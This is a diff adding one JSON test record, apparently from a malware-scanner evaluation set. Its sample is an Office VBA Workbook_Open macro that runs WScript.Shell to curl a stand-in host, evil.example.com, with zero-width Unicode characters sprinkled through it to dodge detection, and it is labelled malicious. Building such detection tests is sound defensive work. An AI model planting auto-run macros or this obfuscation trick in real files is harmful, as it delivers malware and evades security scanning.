@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::92::unicode-variations::3",
+  "base_sample_id": "exp::document-office::92",
+  "generator_id": "unicode-variations",
+  "generator_version": "1.0.0",
+  "seed": -2014534571,
+  "content": "Private ​Sub Wor‍kbook_⁠Op‍en()\n﻿  Creat﻿eObje﻿ct(‌\"WS⁠crip⁠t.Shell\").Run \"cu﻿rl http://evil​.‌e⁠xamp⁠le.com/\"﻿\n⁠End Sub\n⁠",
+  "content_hash": "287bcf21eec9e8f1d8ab345da42467022988e6d5ddef75b20cee2185c3a56b76",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "unicode:zero-width",
+  "difficulty": "advanced"
+}
